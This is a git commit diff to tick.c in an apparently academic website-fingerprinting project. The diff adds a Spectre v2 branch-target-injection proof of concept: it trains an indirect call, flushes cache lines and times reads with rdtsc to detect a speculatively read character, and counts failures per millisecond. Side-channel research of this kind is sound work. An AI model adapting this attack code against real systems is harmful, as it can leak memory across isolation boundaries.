a34d009c8f52414076dfb307c49e2a559fc4e45a
Yifeng Gao <62320364+fgd1988@users.noreply.github.com>
2026-03-06 16:34:45 +0800

    Update tick.c

--- Website Fingerprinting/tick.c
+++ Website Fingerprinting/tick.c
@@ -16,6 +16,8 @@
 #include <pthread.h>
 #include <semaphore.h>
 #include <x86intrin.h>
+#include <stdlib.h>
+#include <sys/time.h>  
 
 int inter_count[100001], cycles;
 double score[512] = {0};
@@ -48,26 +50,119 @@ static void pin_cpu3()
 	CPU_SET(3, &mask);
 	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
 }
+
+
+#define CACHE_HIT_THRESHOLD (200)
+#define GAP (1024)
+#define TARGET_CHAR 'C'
+uint8_t channel[256 * GAP];
+uint64_t *target;
+char *secret = (char[]){TARGET_CHAR};
+
+int gadget(char *addr) {
+    return channel[*addr * GAP];
+}
+
+int safe_target() {
+    return 42;
+}
+
+int victim(char *addr, int input) {
+    int junk = 0;
+    for (int i = 1; i <= 100; i++) {
+        input += i;
+        junk += input & i;
+    }
+
+    int result;
+    __asm volatile(
+        "callq *%1\n"
+        "mov %%eax, %0\n"
+        : "=r"(result)
+        : "r"(*target)
+        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11"
+    );
+    return result & junk;
+}
+
+int run_spectre_v2() {
+    int i, j, junk = 0;
+    uint64_t start, elapsed;
+    uint8_t *addr;
+    char dummyChar = '$';
+
+    for (i = 0; i < 256; i++) {
+        channel[i * GAP] = 1;
+    }
+
+    *target = (uint64_t)&gadget;
+    _mm_mfence();
+    for (j = 50; j > 0; j--) {
+        junk ^= victim(&dummyChar, 0);
+    }
+    _mm_mfence();
+
+    for (i = 0; i < 256; i++) {
+        _mm_clflush(&channel[i * GAP]);
+    }
+    _mm_mfence();
+
+    *target = (uint64_t)&safe_target;
+    _mm_mfence();
+    _mm_clflush((void *)target);
+    _mm_mfence();
+
+    junk ^= victim(secret, 0);
+    _mm_mfence();
+
+    addr = &channel['C' * GAP];
+    start = __rdtsc();
+    junk ^= *addr;
+    _mm_mfence();
+    elapsed = __rdtsc() - start;
+
+    (void)junk;
+    return (elapsed <= CACHE_HIT_THRESHOLD) ? 1 : 0;
+}
+
+static long long get_time_ms() {
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    return tv.tv_sec * 1000LL + tv.tv_usec / 1000;
+}
+
 int count_tick()
 {
-	int ret, i, count;
-	cpu_set_t get;
-	CPU_ZERO(&get);
-	pin_cpu3();
+    int total_attempts = 0;
+    int success_attempts = 0;
+    long long start_time, current_time;
 
-	if (sched_getaffinity(0, sizeof(get), &get) == -1)
-	{
-		printf("warning: can not get cpu affinity/n");
-	}
+    pin_cpu3();
+    prepare();
 
-	prepare();
+        target = (uint64_t *)malloc(sizeof(uint64_t));
+    if (!target) {
+        perror("malloc failed");
+        return -1;
+    }
 
-	while (check() == 1)
-	{
-		count++;
-	}
+    
+    start_time = get_time_ms();
 
-	return count;
+   
+    while (1) {
+                current_time = get_time_ms();
+        if (current_time - start_time >= 1) {
+            break;
+        }
+
+               success_attempts += run_spectre_v2();
+        total_attempts++;
+    }
+
+    free(target);
+
+        return (total_attempts - success_attempts);
 }
 
 static char *progname;
@@ -101,5 +196,9 @@ int main(int argc, char *argv[])
 			printf("this thread %d is running on processor %d\n", gettid(), i);
 		}
 	}
+
+       int fail_count = count_tick();
+    printf("invalidation time/ms: %d\n", fail_count);
+
 	return 0;
 }
